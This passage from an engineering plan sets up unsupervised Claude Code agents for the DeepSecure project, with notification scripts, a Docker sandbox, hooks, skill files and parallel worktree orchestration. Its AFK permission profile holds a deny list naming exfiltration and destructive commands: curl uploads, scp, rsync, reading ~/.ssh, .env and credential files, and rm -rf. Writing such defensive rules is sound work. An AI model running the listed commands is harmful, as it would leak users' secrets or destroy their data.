# Linux notification (libnotify)
if command -v notify-send &>/dev/null; then
  URGENCY_FLAG="normal"
  [ "$URGENCY" = "urgent" ] && URGENCY_FLAG="critical"
  notify-send -u "$URGENCY_FLAG" "$TITLE" "$MESSAGE" 2>/dev/null || true
fi

# Slack webhook (if configured)
if [ -n "${DEEPSECURE_SLACK_WEBHOOK:-}" ]; then
  EMOJI=":robot_face:"
  [ "$URGENCY" = "urgent" ] && EMOJI=":rotating_light:"
  curl -s -X POST "$DEEPSECURE_SLACK_WEBHOOK" \
    -H 'Content-Type: application/json' \
    -d "{\"text\": \"$EMOJI *$TITLE*: $MESSAGE\"}" > /dev/null 2>&1
fi

# Telegram (if configured)
if [ -n "${DEEPSECURE_TELEGRAM_TOKEN:-}" ] && [ -n "${DEEPSECURE_TELEGRAM_CHAT_ID:-}" ]; then
  curl -s -X POST "https://api.telegram.org/bot${DEEPSECURE_TELEGRAM_TOKEN}/sendMessage" \
    -d "chat_id=${DEEPSECURE_TELEGRAM_CHAT_ID}" \
    -d "text=$([ "$URGENCY" = "urgent" ] && echo "🚨" || echo "🤖") $TITLE: $MESSAGE" > /dev/null 2>&1
fi
```

**Security note:** Store webhook URLs and tokens in shell profile (`~/.zshrc` or `~/.bashrc`), NOT in `.env` files that could be committed to git. For a security product, exposing notification credentials in the repo is especially bad optics.

**Effort:** 2 hours | **Impact:** High -- enables true AFK (away from machine)

---

### Phase 3.5: AFK Permissions and Hooks

#### AFK Security Permission Profile

A distinct profile for AFK mode that allows development tools but explicitly denies secrets access and network exfiltration:

```json
{
  "permissions": {
    "allow": [
      "Bash(git:*)",
      "Bash(make:*)",
      "Bash(docker compose:*)",
      "Bash(grep:*)",
      "Bash(ruff:*)",
      "Bash(black:*)",
      "Bash(isort:*)",
      "Bash(mypy:*)",
      "Bash(pytest:*)",
      "Bash(python:*)",
      "Bash(python3:*)",
      "Bash(pip:*)",
      "Bash(gh:*)",
      "Bash(find:*)",
      "Bash(ls:*)",
      "Bash(cat:*)",
      "Bash(echo:*)",
      "Bash(wc:*)",
      "Bash(sort:*)",
      "Bash(head:*)",
      "Bash(tail:*)",
      "Bash(xargs:*)",
      "Bash(jq:*)",
      "Edit",
      "Write",
      "Read"
    ],
    "deny": [
      "Bash(curl:* --upload-file *)",
      "Bash(scp:*)",
      "Bash(rsync:*)",
      "Bash(cat ~/.ssh/*)",
      "Bash(cat */.env*)",
      "Bash(cat */credentials*)",
      "Bash(cat */secrets*)",
      "Bash(rm -rf:*)",
      "Bash(git push --force:*)"
    ]
  }
}
```

**Key difference from Phase 1a:** Phase 1a is a broad allowlist for interactive use. This AFK profile adds explicit denials for dangerous operations that an unsupervised agent should never do.

**CRITICAL WARNING (May 2026 review):** The deny-list above is a defense-in-depth layer, NOT a primary security control. Pattern-based denials are trivially bypassed (see Pillar 5 warning). For true unsupervised AFK execution, use a Docker sandbox:

#### Docker Sandbox for AFK Execution (Recommended)

The industry-standard approach (Ramp, Cursor, OpenAI) for unsupervised agent execution is environment-level isolation, not command-level pattern matching:

```bash
#!/bin/bash
# scripts/afk-sandbox.sh - Run AFK agent in a Docker sandbox
# Secrets are never mounted. The agent literally cannot access them.

WORKSTREAM=${1:?"Usage: afk-sandbox.sh <workstream-name>"}

docker run --rm -it \
  -v "$(pwd):/workspace" \
  -v "$HOME/.claude:/root/.claude:ro" \
  -w /workspace \
  --network host \
  -e RALPH_MAX_BUDGET=5.00 \
  -e RALPH_MAX_ITERATIONS=10 \
  python:3.11-slim \
  bash -c "
    pip install claude-code && \
    cd /workspace && \
    ./scripts/ralph.sh $WORKSTREAM
  "

# What's NOT mounted:
# - ~/.ssh/ (no SSH keys)
# - ~/.aws/ (no AWS credentials)
# - ~/.config/gcloud/ (no GCP credentials)
# - .env files with secrets (only workspace code)
```

The deny-list remains useful as a secondary control for non-sandboxed interactive development — it catches accidental access. But for overnight AFK, use the sandbox.

#### Additional Hook Events

**IMPORTANT (May 2026 API verification):** The hook event names below have been corrected to match the actual Claude Code API. Earlier versions of this document used incorrect event names (`PostCompact`, `PreCompact`, `PermissionRequest`, `SessionEnd`, `SubagentStop`). The corrected hook configuration:

```json
{
  "hooks": {
    "PostToolUse": [
      {
        "matcher": "Edit|Write",
        "hooks": [{
          "type": "command",
          "command": "FILE_PATH=$(echo $TOOL_INPUT | jq -r '.file_path // empty'); if [ -n \"$FILE_PATH\" ] && echo \"$FILE_PATH\" | grep -q '\\.py$'; then ruff format --quiet \"$FILE_PATH\" 2>/dev/null; isort --quiet \"$FILE_PATH\" 2>/dev/null; fi"
        }]
      }
    ],
    "SessionStart": [
      {
        "matcher": "compact",
        "hooks": [{
          "type": "command",
          "command": "cat .claude/compact-recovery.md 2>/dev/null || true"
        }]
      }
    ],
    "Stop": [
      {
        "hooks": [{
          "type": "command",
          "command": ".claude/hooks/on-task-stop.sh"
        }]
      }
    ],
    "Notification": [
      {
        "matcher": "permission_prompt",
        "hooks": [{
          "type": "command",
          "command": "scripts/notify.sh 'Permission Blocked' 'Claude Code is waiting for permission approval' urgent"
        }]
      }
    ],
    "SessionStart": [
      {
        "matcher": "startup",
        "hooks": [{
          "type": "command",
          "command": "echo '--- Recent commits ---'; git log --oneline -5 2>/dev/null; echo '--- Branch ---'; git branch --show-current 2>/dev/null; echo '--- Open PRs ---'; gh pr list --limit 3 2>/dev/null || true"
        }]
      }
    ]
  }
}
```

**Corrected event names (May 2026):**

| Old (Incorrect) | New (Correct) | Notes |
|------------------|---------------|-------|
| `PostCompact` | `SessionStart` with `matcher: "compact"` | Fires when context is compacted |
| `PreCompact` | *(does not exist)* | No pre-compaction hook available |
| `PermissionRequest` | `Notification` with `matcher: "permission_prompt"` | Fires when agent is blocked on permission |
| `SessionEnd` | *(does not exist as a separate event)* | Use `Stop` hook instead |
| `SubagentStop` | *(does not exist as a separate event)* | Agent harness handles this internally |

**Effort:** 2 hours | **Impact:** High -- comprehensive AFK safety net and event tracking

---

### Phase 4: New Skills for AFK Operation

Based on Thariq's 9-category skill framework, Boris's patterns, and gaps identified in research:

#### Skill: `/babysit-pr` (Deployment & Workflow category)

Monitors a PR through its lifecycle, retrying flaky CI runs, resolving merge conflicts, and enabling auto-merge when green. Designed to work with Boris's `/loop` command for continuous monitoring.

```markdown
---
name: babysit-pr
description: Monitor a PR through CI, review, and merge lifecycle
model: sonnet
tools:
  - Bash(gh:*)
  - Bash(git:*)
  - Read
  - Monitor
---

# Babysit PR

## Purpose
Monitor a PR through its full lifecycle until it's merged or needs human intervention.

## Anti-Rationalization Table
| Agent Might Say | Why It's Wrong | Do This Instead |
|----------------|----------------|-----------------|
| "CI is just flaky, ignore it" | Flaky CI masks real failures | Re-run once, then investigate |
| "The merge conflict is trivial" | Trivial conflicts can corrupt logic | Resolve carefully, run tests after |
| "Auto-merge is safe now" | Only if ALL checks pass | Verify every check before enabling |

## Workflow
1. Get PR number from user or detect from current branch
2. Check PR status: CI checks, review status, merge conflicts
3. If CI is flaky (failed then passed on re-run history): trigger re-run via `gh run rerun`
4. If merge conflicts exist: attempt automatic resolution, run tests after
5. If reviews are approved and CI is green: enable auto-merge via `gh pr merge --auto`
6. If stuck for >30 minutes: notify via scripts/notify.sh
7. Loop until merged or human intervention needed (use Monitor tool for event-driven waiting)

## Integration with /loop
Can be invoked as: `/loop 5m /babysit-pr 123`
```

#### Skill: `/autofix-pr` (Code Quality category)

```markdown
---
name: autofix-pr
description: Autonomously fix CI failures and address review comments on a PR
model: sonnet
tools:
  - Edit
  - Write
  - Read
  - Bash(git:*)
  - Bash(gh:*)
  - Bash(pytest:*)
  - Bash(ruff:*)
  - Bash(make:*)
---

# Auto-Fix PR

## Purpose
Take an existing PR and autonomously fix CI failures and address review comments.

## Anti-Rationalization Table
| Agent Might Say | Why It's Wrong | Do This Instead |
|----------------|----------------|-----------------|
| "This review comment is wrong" | Reviewer may have context you don't | Implement it, note disagreement in commit msg |
| "Fixing this will break something else" | That's why we run tests after | Fix it and run full test suite |
| "This CI failure is unrelated" | Prove it by reading the log | Read the full failure log first |

## Workflow
1. Get PR number and fetch current status
2. Read CI failure logs: `gh pr checks <number>`
3. Read review comments: `gh api repos/{owner}/{repo}/pulls/{number}/comments`
4. For each CI failure:
   a. Identify the failing test or lint error
   b. Read the relevant source code
   c. Fix the issue
   d. Run the test locally to verify
   e. Commit with message referencing the CI failure
5. For each review comment:
   a. Read the comment and surrounding code context
   b. Implement the requested change
   c. Commit with message referencing the review
6. Push all fixes
7. Notify when done

## Rules
- Never force-push
- Each fix gets its own commit with clear message
- If a fix is ambiguous, skip it and notify for human review
- Run full test suite before pushing
```

#### Skill: `/grill-me` (Workflow Automation category)

```markdown
---
name: grill-me
description: Interview user relentlessly about a feature before generating any code or plan
model: opus
tools:
  - Read
  - Bash(find:*)
  - Bash(grep:*)
---

# Grill Me

## Purpose
Interview the user relentlessly about every aspect of a feature before generating any code or plan. Based on Matt Pocock's methodology of reaching shared understanding through 40-80 questions.

## Workflow
1. Read the user's initial description
2. Ask questions in these categories (minimum 5 questions per category):
   - Scope: What's in? What's explicitly out?
   - Users: Who uses this? What's their current workflow?
   - Data: What data flows in/out? What's the schema?
   - Edge cases: What happens when X fails? What about empty state?
   - Security: What are the auth requirements? What can go wrong?
   - Integration: How does this connect to existing systems?
   - Testing: How will we know it works? What are the acceptance criteria?
3. After exhausting questions, summarize the shared understanding
4. Ask: "Is this understanding complete and correct?"
5. Only then generate a PRD or design doc

## Rules
- NEVER generate code during this skill
- NEVER generate a plan during this skill
- Ask follow-up questions on every answer
- Challenge vague answers: "What specifically do you mean by X?"
- Minimum 20 questions before summarizing
```

#### Skill: `/verify-app` (Product Verification category)

```markdown
---
name: verify-app
description: End-to-end verification that a feature works in the running DeepSecure stack
model: sonnet
tools:
  - Read
  - Bash(curl:*)
  - Bash(docker:*)
  - Bash(docker compose:*)
  - Bash(python:*)
  - Bash(python3:*)
---

# Verify App

## Purpose
Verify that a feature or fix actually works end-to-end in the running DeepSecure stack.

## Workflow
1. Ensure backend services are running: `docker compose ps`
2. If not running: `docker compose up -d`
3. Wait for health checks:
   - `curl http://localhost:8000/health` (Control plane)
   - `curl http://localhost:8002/health` (Gateway)
4. Execute the verification scenario:
   a. Create test user and login (get User Token)
   b. Register test agent (get Agent JWT via challenge-response)
   c. Execute the feature being verified
   d. Assert expected outcomes
5. Capture results and report

## Token Type Reference
- User Token: POST /api/v1/auth/login -> .token (NOT .access_token)
- Agent JWT: challenge-response flow (see CLAUDE.md)
- Internal Token: From docker-compose.yml env var

## MCP Gateway Requirement
Always call `initialize` before `tools/call` on the Gateway.
```

#### Agent: `doc-gardener` (Infrastructure Operations category)

Audits skills, CLAUDE.md, and documentation for staleness. Addresses Carson's "skills decay" problem.

```markdown
---
name: doc-gardener
description: Audits skills, CLAUDE.md, and docs for staleness and conflicts
model: haiku
tools:
  - Read
  - Bash(git:*)
  - Bash(grep:*)
  - Bash(find:*)
---

# Doc Gardener

## Purpose
Periodically audit the repo's agent infrastructure for staleness, conflicts, and drift.

## Checks
1. **Skills staleness**: Compare skill instructions against current codebase
   - Do referenced file paths still exist?
   - Do referenced commands still work?
   - Do referenced APIs still have the same signatures?
2. **CLAUDE.md drift**: Compare documented patterns against actual code
   - Are "Lessons Learned" entries still relevant?
   - Do documented ports/URLs match docker-compose.yml?
3. **Agent frontmatter**: Verify all agents have YAML frontmatter
4. **Hook validity**: Verify all hook scripts exist and are executable
5. **Dead references**: Find broken links in docs/

## Output
Markdown report listing:
- Stale items (with suggested updates)
- Conflicts found
- Items verified as current

## Scheduling
Run via: `/loop 24h /doc-gardener` or as a weekly cron routine
```

#### Skill: `/context-engineering` (Data & Monitoring category)

Guidance on managing context for long-running and AFK sessions.

```markdown
---
name: context-engineering
description: Manage context window efficiently for long-running and AFK sessions
model: sonnet
tools:
  - Read
  - Bash(wc:*)
---

# Context Engineering

## When to Use
- Before starting a long AFK session
- When context window is >80% full
- After compaction produces unexpected behavior

## Rules
1. **Keep context under 100k tokens** -- clear and restart rather than compact
2. **Use files, not context, for memory** -- write state to disk, read it back next iteration
3. **Progressive disclosure** -- start with CLAUDE.md, load detailed docs only when needed
4. **MCP for external data** -- use MCP tools for databases, APIs, monitoring instead of dumping data into context

## Compaction Strategy
- SessionStart hook (compact matcher) re-injects critical rules from .claude/compact-recovery.md
- If quality degrades after compaction, exit and restart with fresh context
- For Ralph loops: each iteration is naturally a fresh context (no compaction needed)

## Context Budget
| Content Type | Token Budget | Notes |
|-------------|-------------|-------|
| CLAUDE.md | ~2k (after refactoring) | Currently ~8k -- too large |
| Task context | ~5k | Current task ticket + acceptance criteria |
| Code context | ~30k | Files being modified |
| Test output | ~5k | Recent test results |
| Reserve | ~58k | For agent reasoning |
| **Total** | **~100k** | Stay under this |
```

#### Skill: `/identity-management` (Infrastructure Operations category)

Integrates with DeepSecure's own Control Plane for AFK agent identity provisioning. Part of the dog-fooding strategy (see [DeepSecure as AFK Security Infrastructure](#deepsecure-as-afk-security-infrastructure-dog-fooding)).

```markdown
---
name: identity-management
description: Provision and manage Ed25519 identities and delegation_tokens for AFK agent swarms
model: sonnet
tools:
  - Bash(curl:*)
  - Bash(python:*)
  - Bash(python3:*)
  - Read
  - Write
---

# Identity Management

## Purpose
Provision ephemeral identities for AFK agents using DeepSecure's own identity system.

## Workflow
1. Generate Ed25519 keypair for the new agent/worktree
2. Register agent with Control Plane (POST /api/v1/agents/)
3. Create delegation with scoped permissions (POST /api/v1/auth/delegate)
4. Inject credentials into worktree environment (.env)
5. Verify identity works (challenge-response flow)
6. Set up credential rotation for long-running sessions

## Gotchas
- See .claude/skills/identity-management/gotchas.md
- Login API returns `.token` not `.access_token`
- Agent JWT requires full challenge-response flow (not just a token swap)
- delegation_tokens have TTL -- set renewal before expiry
```

#### Skill: `/security-scan` (Code Quality category)

Forces vulnerability scanning on Python diffs before git commit during AFK execution.

```markdown
---
name: security-scan
description: Run security scans on modified Python files before committing
model: sonnet
tools:
  - Bash(git:*)
  - Bash(bandit:*)
  - Bash(safety:*)
  - Bash(ruff:*)
  - Read
---

# Security Scan

## Purpose
Prevent AFK agents from committing code with known security vulnerabilities.

## Workflow
1. Get list of modified Python files: `git diff --name-only --cached -- '*.py'`
2. Run bandit on modified files: `bandit -f json <files>`
3. Check for high/critical severity findings
4. If found: block commit, report findings, attempt auto-fix
5. If clean: allow commit to proceed

## Integration
Add as a PreToolUse hook matching `Bash(git commit:*)` to enforce on every commit:
```json
{
  "hooks": {
    "PreToolUse": [{
      "matcher": { "tool_name": "Bash", "command": "git commit*" },
      "command": "scripts/security-scan.sh"
    }]
  }
}
```

## Anti-Rationalization Table
| Agent Might Say | Why It's Wrong | Do This Instead |
|----------------|----------------|-----------------|
| "Bandit is too noisy" | Filter by severity, don't skip | Use `-ll` for high-severity only |
| "This finding is a false positive" | Prove it with a `# nosec` + comment | Add targeted suppression, not blanket skip |
| "Security scan is slow" | 2-3 seconds per file is acceptable | Run only on changed files, not full repo |
```

#### Ed25519 Gotchas File

Create `.claude/skills/identity-management/gotchas.md`:

```markdown
# Ed25519 Gotchas for AFK Agents

## Critical Pitfalls
| Pitfall | What Goes Wrong | Prevention |
|---------|----------------|------------|
| Using `nacl.signing.SigningKey.generate()` without seeding | Non-reproducible keys | Always store keys to disk after generation |
| Base64 vs hex encoding mismatch | Signature verification fails silently | Control Plane expects base64 public keys |
| Challenge replay | Old challenges are rejected | Always request fresh challenge before signing |
| Token field naming | Login returns `token`, verify returns `access_token` | Check the endpoint-specific field name |
| Private key in env var | Leaked via `ps` or `/proc` | Use keyring or file with 0600 permissions |
```

**Effort:** 4 hours per skill/agent (40 hours total for 10 items) | **Impact:** High

---

### Phase 5: CLAUDE.md Refactoring (OpenAI Pattern)

**PREREQUISITE (May 2026 review finding):** Phase 1d (SessionStart compact hook) MUST be implemented and tested BEFORE this phase. Without it, splitting CLAUDE.md is a regression — referenced files are NOT auto-loaded by Claude Code, so every fresh Ralph iteration starts without critical rules. The SessionStart hook that `cat`s `.claude/compact-recovery.md` is the mechanism that ensures critical rules survive the split.

**Additionally**, the ralph-prompt.md template MUST explicitly instruct the agent to read referenced files at the start of each iteration. Without this, agents will only see the slim CLAUDE.md and miss backend conventions, token types, etc.

Split the current ~800-line CLAUDE.md into a slim root file with pointers to detailed references, following OpenAI's progressive disclosure pattern.

#### Target Structure

```
CLAUDE.md                              (~100 lines, TOC + critical rules only)
CODE_STANDARDS.md                      (enforced by reviewer agent on PRs, not during implementation)
.claude/compact-recovery.md            (re-injected after compaction)
.afk/learnings.md                      (AFK loop failure log -- see Phase 2c)
docs/
  DEVELOPMENT_COMMANDS.md              (extracted: setup, test, lint, build commands)
  ARCHITECTURE.md                      (extracted: module structure, patterns)
  TESTING_STRATEGY.md                  (extracted: test org, markers, fixtures)
  TOKEN_TYPES.md                       (extracted: critical auth gotchas)
  LESSONS_LEARNED.md                   (extracted: pitfalls, anti-patterns)
  TASK_WORKFLOW.md                     (extracted: breakdown, ticket structure)
  BACKEND_CONVENTIONS.md               (extracted: file paths, naming)
  AFK_WORKFLOWS.md                     (this document)
```

#### Slim CLAUDE.md Template

```markdown
# CLAUDE.md

## Project
DeepSecure: Identity-as-Code for AI agents. Python CLI/SDK + backend services.

## Quick Reference
- Install: `make install-dev`
- Test: `pytest` | `make test-cov`
- Lint: `ruff check .` | `mypy deepsecure/`
- Format: `black .` | `isort .`
- All checks: `make check-all`

## Critical Rules
1. Always run `make check-all` before declaring done
2. Use correct token types (see docs/TOKEN_TYPES.md)
3. Verify file paths exist before documenting them
4. Never commit secrets or private keys
5. Login API returns `.token` not `.access_token`
6. MCP Gateway requires `initialize` before `tools/call`

## Architecture (read docs/ARCHITECTURE.md for details)
- `deepsecure/_core/`: Internal implementation
- `deepsecure/`: Public API layer
- `deeptrail-control/`: Control plane (port 8000)
- `deeptrail-gateway/`: Data plane (port 8002)

## Detailed References
| Topic | File |
|-------|------|
| Development commands | docs/DEVELOPMENT_COMMANDS.md |
| Architecture & patterns | docs/ARCHITECTURE.md |
| Testing strategy | docs/TESTING_STRATEGY.md |
| Token types & auth | docs/TOKEN_TYPES.md |
| Lessons learned | docs/LESSONS_LEARNED.md |
| Task workflow | docs/TASK_WORKFLOW.md |
| Backend conventions | docs/BACKEND_CONVENTIONS.md |
| Code standards | CODE_STANDARDS.md |
| AFK workflows | docs/AFK_WORKFLOWS.md |
```

#### CODE_STANDARDS.md Pattern

Move code quality rules out of CLAUDE.md into a separate file used only by the reviewer agent:

```markdown
# CODE_STANDARDS.md
# This file is consumed by the code-review skill, NOT during implementation.
# Saves tokens during coding, spends them during review.

## DRY Violations
Flag any function >10 lines that appears in substantially similar form elsewhere.

## Error Handling
Every external API call must have explicit error handling.
Every database query must handle connection failures.

## Security
No raw SQL queries -- use parameterized queries only.
No hardcoded secrets -- use environment variables or vault.
JWT tokens must have expiration times.

## Testing
Every new function needs at least one unit test.
Every new API endpoint needs at least one integration test.
E2E tests for cross-service features.
```

**Effort:** 4 hours | **Impact:** Medium -- reduces token cost per session, faster startup, progressive disclosure

---

### Phase 6: Parallel Orchestration

**UPDATED (May 2026):** Claude Code's Dynamic Workflows (launched May 28, 2026) may replace much of this phase's manual infrastructure. Evaluate Dynamic Workflows first before building custom tmux/worktree orchestration.

**Two approaches available:**

| Approach | When to Use | Complexity |
|----------|-------------|-----------|
| **Dynamic Workflows** (new) | Intra-batch parallelism (multiple independent tasks within one batch) | Low — built into Claude Code |
| **Sandcastle-style scripts** (below) | Multi-service parallel development (control plane + gateway in separate worktrees) | High — custom scripts |

**Recommendation:** Start with Dynamic Workflows for most parallel work. Only build the Sandcastle scripts if you need multi-worktree isolation for services that share no files.

For truly parallel AFK operation on multi-service features, the Sandcastle approach combines worktree isolation with automated agent spawning, following Matt Pocock's Sandcastle orchestration pattern.

#### Orchestration Pattern

Following Sandcastle's staged pipeline:

```
1. Planner    -- Reads design doc, creates task prompts per service
2. Implementer -- N parallel agents, each in own worktree (scripts/parallel-build.sh)
3. Reviewer   -- Agent reviews each worktree's changes (code-reviewer agent)
4. Merger     -- Merges branches back to feature branch (scripts/merge-parallel.sh)
```

#### Parallel Build Script

```bash
#!/bin/bash
# scripts/parallel-build.sh
# Spawn parallel Claude agents on separate worktrees for multi-service work
#
# Usage: ./scripts/parallel-build.sh <feature-name> [service1 service2 ...]
# Example: ./scripts/parallel-build.sh idp-sso control gateway

set -euo pipefail

FEATURE=${1:?"Usage: parallel-build.sh <feature-name> [services...]"}
shift
SERVICES=${@:-"control gateway"}
BASE_DIR=$(git rev-parse --show-toplevel)
LOG_DIR="$BASE_DIR/docs/workstreams/$FEATURE/parallel-logs"
PIDS=()

mkdir -p "$LOG_DIR"

echo "=== Parallel Build: $FEATURE ==="
echo "Services: $SERVICES"
echo "Base: $BASE_DIR"
echo "Started: $(date)"
echo ""

# Create worktrees and spawn agents
for SVC in $SERVICES; do
  BRANCH="feature/${FEATURE}-${SVC}"
  WORKTREE="$BASE_DIR/../${FEATURE}-${SVC}"
  PROMPT="docs/workstreams/$FEATURE/tasks/${SVC}-prompt.md"
  LOG="$LOG_DIR/${SVC}.log"

  echo "--- Setting up $SVC ---"

  # Create worktree if it doesn't exist
  if [ ! -d "$WORKTREE" ]; then
    git worktree add "$WORKTREE" -b "$BRANCH" dev 2>/dev/null || \
    git worktree add "$WORKTREE" "$BRANCH" 2>/dev/null
    echo "Created worktree: $WORKTREE ($BRANCH)"
  else
    echo "Worktree exists: $WORKTREE"
  fi

  # Copy Claude configuration
  cp -r "$BASE_DIR/.claude" "$WORKTREE/" 2>/dev/null || true
  cp "$BASE_DIR/CLAUDE.md" "$WORKTREE/" 2>/dev/null || true

  # CRITICAL (race condition fix): Each worktree gets its OWN progress file.
  # Sharing ralph_progress.json across worktrees causes both agents to pick the same task.
  # The per-service prompt file ($PROMPT) should reference a service-specific progress file.
  if [ ! -f "$WORKTREE/docs/workstreams/$FEATURE/ralph_progress_${SVC}.json" ]; then
    echo "WARNING: No service-specific progress file found. Agents may race on shared tasks."
  fi

  # Verify prompt file exists
  if [ ! -f "$BASE_DIR/$PROMPT" ]; then
    echo "WARNING: $PROMPT not found. Skipping $SVC."
    continue
  fi

  # Spawn Claude agent in background
  echo "Spawning agent for $SVC (log: $LOG)"
  (
    cd "$WORKTREE"
    claude --print \
      --output-format json \
      --prompt-file "$BASE_DIR/$PROMPT" \
      --allowedTools "Edit,Write,Read,Bash(git:*),Bash(pytest:*),Bash(make:*),Bash(ruff:*),Bash(python:*),Bash(find:*),Bash(grep:*),Bash(ls:*)" \
      --max-turns 100 \
      2>&1 | tee "$LOG"

    # Notify on completion
    "$BASE_DIR/scripts/notify.sh" "Parallel Build" "$SVC agent complete for $FEATURE"
  ) &
  PIDS+=($!)
  echo "Agent PID: ${PIDS[-1]}"
  echo ""
done

echo "=== All agents spawned ==="
echo "PIDs: ${PIDS[*]}"
echo ""
echo "Waiting for all agents to complete..."
echo "(You can safely go AFK now)"
echo ""

# Wait for all agents and track failures
FAILED_SVCS=()
SVC_INDEX=0
for PID in "${PIDS[@]}"; do
  SVC_NAME=$(echo $SERVICES | tr ' ' '\n' | sed -n "$((SVC_INDEX+1))p")
  if ! wait $PID 2>/dev/null; then
    FAILED_SVCS+=("$SVC_NAME")
    echo "FAILED: $SVC_NAME agent (PID $PID) exited with error"
  fi
  SVC_INDEX=$((SVC_INDEX+1))
done

if [ ${#FAILED_SVCS[@]} -gt 0 ]; then
  "$BASE_DIR/scripts/notify.sh" "Parallel Build" "FAILURES: ${FAILED_SVCS[*]}" "urgent"
fi

echo ""
echo "=== All agents complete ==="
echo "Finished: $(date)"
echo ""

# Summary
for SVC in $SERVICES; do
  WORKTREE="$BASE_DIR/../${FEATURE}-${SVC}"
  if [ -d "$WORKTREE" ]; then
    COMMITS=$(cd "$WORKTREE" && git log --oneline dev..HEAD 2>/dev/null | wc -l | tr -d ' ')
    echo "$SVC: $COMMITS new commits"
  fi
done

echo ""
echo "Next steps:"
echo "  1. Review changes in each worktree"
echo "  2. Create PRs: cd ../${FEATURE}-<service> && gh pr create"
echo "  3. Cleanup: git worktree remove ../${FEATURE}-<service>"

# Final notification
"$BASE_DIR/scripts/notify.sh" "Parallel Build Complete" "All agents finished for $FEATURE" "urgent"
```

#### Merge-Back Script

After parallel agents complete, merge their work:

```bash
#!/bin/bash
# scripts/merge-parallel.sh
# Merge parallel worktree branches back to a feature branch
#
# Usage: ./scripts/merge-parallel.sh <feature-name> [services...]

set -euo pipefail

FEATURE=${1:?"Usage: merge-parallel.sh <feature-name> [services...]"}
shift
SERVICES=${@:-"control gateway"}
MERGE_BRANCH="feature/$FEATURE"

echo "=== Merging parallel work for $FEATURE ==="

# Create merge branch from dev
git checkout -b "$MERGE_BRANCH" dev 2>/dev/null || git checkout "$MERGE_BRANCH"

for SVC in $SERVICES; do
  BRANCH="feature/${FEATURE}-${SVC}"

  echo "--- Merging $BRANCH ---"

  if git merge "$BRANCH" --no-edit; then
    echo "Merged $BRANCH successfully"
  else
    echo "CONFLICT merging $BRANCH. Resolve manually."
    echo "  git mergetool"
    echo "  git merge --continue"
    exit 1
  fi
done

echo ""
echo "=== All branches merged into $MERGE_BRANCH ==="
echo "Run tests: make check-all"
echo "Create PR: gh pr create --base dev"
```

**Branch strategies** (from Sandcastle):
- `head`: Each agent commits directly to the feature branch (simple, risk of conflict)
- `merge-to-head`: Each agent works on a sub-branch, merged back at the end (safer)
- `branch`: Each agent stays on its own branch, human merges (safest)

For DeepSecure, use `merge-to-head` as the default since control and gateway rarely conflict.

#### Tmux-Based Headless Orchestration

For long-running AFK sessions (overnight), prefer tmux over bare `&` backgrounding. This gives observability, persistence, and recovery:

```bash
#!/bin/bash
# scripts/parallel-build-tmux.sh
# Tmux-based variant of parallel-build.sh for overnight AFK sessions

FEATURE=${1:?"Usage: parallel-build-tmux.sh <feature-name> [services...]"}
shift
SERVICES=${@:-"control gateway"}
BASE_DIR=$(git rev-parse --show-toplevel)

# Create a tmux session group for the feature
tmux new-session -d -s "${FEATURE}-orchestrator" "echo 'Orchestrator for $FEATURE'; bash"

for SVC in $SERVICES; do
  WORKTREE="$BASE_DIR/../${FEATURE}-${SVC}"
  PROMPT="docs/workstreams/$FEATURE/tasks/${SVC}-prompt.md"

  # Each agent gets its own tmux window within the session
  tmux new-window -t "${FEATURE}-orchestrator" -n "$SVC" \
    "cd $WORKTREE && claude --print --prompt-file $BASE_DIR/$PROMPT --max-turns 100 2>&1 | tee $BASE_DIR/docs/workstreams/$FEATURE/parallel-logs/${SVC}.log; echo 'DONE'; bash"
done

echo "Agents spawned in tmux session: ${FEATURE}-orchestrator"
echo "  Observe:  tmux attach -t ${FEATURE}-orchestrator"
echo "  List:     tmux list-windows -t ${FEATURE}-orchestrator"
echo "  Kill all: tmux kill-session -t ${FEATURE}-orchestrator"
```

#### Keepalive Mechanisms

Long-running AFK sessions may be terminated by idle timeouts (SSH, tmux, cloud instances). Prevent this with keepalive strategies:

| Mechanism | How | When to Use |
|-----------|-----|-------------|
| `session_keepalive_interval_ms` | Claude Code config option, sends periodic pings | Cloud-hosted sessions |
| Tmux watchdog script | Sends keystrokes or checks process health | Long overnight runs |
| Heartbeat hook | SessionStart hook with periodic check-in | Any AFK session |

```bash
# Tmux watchdog: restart agent if it dies unexpectedly
while true; do
  if ! tmux has-session -t "agent-1" 2>/dev/null; then
    scripts/notify.sh "Watchdog" "agent-1 session died. Restarting..." "urgent"
    tmux new-session -d -s "agent-1" "cd /path/to/worktree-1 && claude --print --prompt-file ralph-prompt.md --max-turns 80"
  fi
  sleep 300
done
```

#### Hermes Agent as Orchestration Layer

Nous Research's [Hermes Agent](https://github.com/nousresearch/hermes-agent) (169k+ stars) is a persistent, self-improving autonomous agent that can serve as a meta-orchestrator above Claude Code. It doesn't replace Claude Code — it delegates coding work to it while handling scheduling, memory, notifications, and multi-agent coordination.

**What Hermes provides that bash scripts don't:**

| Capability | Bash Scripts (Current) | Hermes Agent |
|------------|----------------------|--------------|
| **Scheduling** | `cron` + `ralph.sh` | Built-in cron with natural-language task definitions |
| **Notifications** | `scripts/notify.sh` + Slack webhook | Native multi-platform: Slack, Telegram, Discord, WhatsApp, Signal, SMS, Email from one process |
| **Memory** | File-based (`ralph_progress.json`, `.afk/learnings.md`) | Agent-curated persistent memory with FTS5 search over session history, cross-session recall |
| **Parallelism** | `&` backgrounding or tmux sessions | ThreadPoolExecutor (up to 8 parallel workers), subagent spawning |
| **Isolation** | Git worktrees | 6 terminal backends: local, Docker, SSH, Singularity, Modal (serverless), Daytona |
| **Skills** | Static markdown files | Auto-created, self-improving skills compatible with agentskills.io standard |
| **Coding agents** | Claude Code only | Delegates to Claude Code, OpenAI Codex, or OpenCode — picks best tool per task |

**Architecture if adopted:**
```
Hermes Agent (orchestrator)
  ├── Cron: "every night at 2am, run the Ralph loop on workstream X"
  ├── Memory: persistent cross-session learnings (replaces .afk/learnings.md)
  ├── Notifications: Slack + Telegram natively (replaces scripts/notify.sh)
  ├── Parallel workers: up to 8 concurrent subagents
  │
  └── Delegates coding to:
      └── Claude Code (subordinate)
          ├── Your 23 command skills
          ├── CLAUDE.md context
          ├── Hooks pipeline
          └── Worktree isolation
```

**Trade-offs:**
- **Pro:** Solves scheduling, notifications, memory, and multi-agent coordination in one tool
- **Pro:** Serverless backends (Modal, Daytona) eliminate keepalive problems — agents hibernate and resume
- **Pro:** Self-improving skills address Carson's "skills decay" problem structurally
- **Con:** Adds a Python dependency and abstraction layer between you and Claude Code
- **Con:** Debugging becomes harder (is the issue Hermes orchestration or Claude Code execution?)
- **Con:** Your existing 23 command skills and hooks are Claude Code native — they'd work through Hermes but with an extra layer of indirection

